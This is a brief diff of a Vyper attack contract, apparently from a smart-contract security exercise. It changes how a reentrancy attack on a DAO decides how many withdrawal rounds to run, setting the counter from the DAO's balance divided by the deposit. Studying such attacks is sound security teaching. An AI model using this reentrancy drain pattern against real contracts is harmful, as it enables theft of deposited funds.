@@ -12,7 +12,6 @@ counter: public(uint256)
 def __init__():
     self.dao_address = ZERO_ADDRESS
     self.owner_address = ZERO_ADDRESS
-    self.counter = 10
 
 @internal
 def _attack() -> bool:
@@ -39,6 +38,8 @@ def attack(dao_address:address):
     
     # TODO: make the deposit into the DAO
     DAO(dao_address).deposit(value=deposit_amount)
+    
+    self.counter = DAO(dao_address).userBalances(dao_address) / deposit_amount
     
     # TODO: Start the reentrance attack
     if(self.counter > 0):
